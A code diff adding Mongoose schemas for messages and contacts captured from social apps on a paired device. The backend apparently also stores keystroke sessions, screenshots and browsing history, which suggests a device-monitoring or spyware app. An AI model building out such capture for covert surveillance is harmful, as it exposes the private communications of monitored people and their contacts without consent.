@@ -539,6 +539,130 @@ pairingCodeSchema.index({ expiresAt: 1 }, { expireAfterSeconds: 0 });
 
 const PairingCode = mongoose.model('PairingCode', pairingCodeSchema);
 
+// ================== SOCIAL MEDIA MODELS ==================
+
+// Social Media Message Schema
+const socialMessageSchema = new mongoose.Schema({
+  message_id: {
+    type: String,
+    required: true,
+    unique: true
+  },
+  device_id: {
+    type: String,
+    required: true,
+    index: true
+  },
+  // App info
+  app_package: {
+    type: String,
+    required: true
+  },
+  app_name: {
+    type: String,
+    required: true
+  },
+  // Contact info
+  contact_name: {
+    type: String,
+    required: true,
+    index: true
+  },
+  contact_identifier: {
+    type: String,
+    required: true
+  },
+  // Message content
+  message_text: {
+    type: String,
+    required: true
+  },
+  timestamp: {
+    type: Number,
+    required: true,
+    index: true
+  },
+  message_type: {
+    type: String,
+    enum: ['SENT', 'RECEIVED'],
+    required: true
+  },
+  // Media
+  media_type: {
+    type: String,
+    enum: ['PHOTO', 'VIDEO', 'VOICE', 'STICKER', 'FILE', 'LOCATION']
+  },
+  // Group info
+  is_group_chat: {
+    type: Boolean,
+    default: false
+  },
+  group_name: String,
+  sender_in_group: String,
+  // Timestamps
+  created_at: {
+    type: Date,
+    default: Date.now
+  }
+});
+
+// Compound indexes for fast queries
+socialMessageSchema.index({ device_id: 1, app_package: 1, contact_name: 1, timestamp: 1 });
+socialMessageSchema.index({ device_id: 1, timestamp: -1 });
+
+// Auto-delete after 90 days
+socialMessageSchema.index({ created_at: 1 }, { expireAfterSeconds: 7776000 });
+
+const SocialMessage = mongoose.model('SocialMessage', socialMessageSchema);
+
+// Social Media Contact Schema
+const socialContactSchema = new mongoose.Schema({
+  device_id: {
+    type: String,
+    required: true
+  },
+  app_package: {
+    type: String,
+    required: true
+  },
+  contact_name: {
+    type: String,
+    required: true
+  },
+  contact_identifier: {
+    type: String,
+    required: true
+  },
+  profile_photo: String, // Base64
+  last_message_time: {
+    type: Number,
+    default: 0
+  },
+  last_message_text: String,
+  last_message_type: {
+    type: String,
+    enum: ['SENT', 'RECEIVED']
+  },
+  message_count: {
+    type: Number,
+    default: 0
+  },
+  unread_count: {
+    type: Number,
+    default: 0
+  },
+  updated_at: {
+    type: Date,
+    default: Date.now
+  }
+});
+
+// Unique compound index
+socialContactSchema.index({ device_id: 1, app_package: 1, contact_name: 1 }, { unique: true });
+socialContactSchema.index({ device_id: 1, last_message_time: -1 });
+
+const SocialContact = mongoose.model('SocialContact', socialContactSchema);
+
 module.exports = {
   User,
   Device,
@@ -551,5 +675,7 @@ module.exports = {
   Screenshot,
   BrowserHistory,
   KeystrokeSession,
-  PairingCode
+  PairingCode,
+  SocialMessage,
+  SocialContact
 };
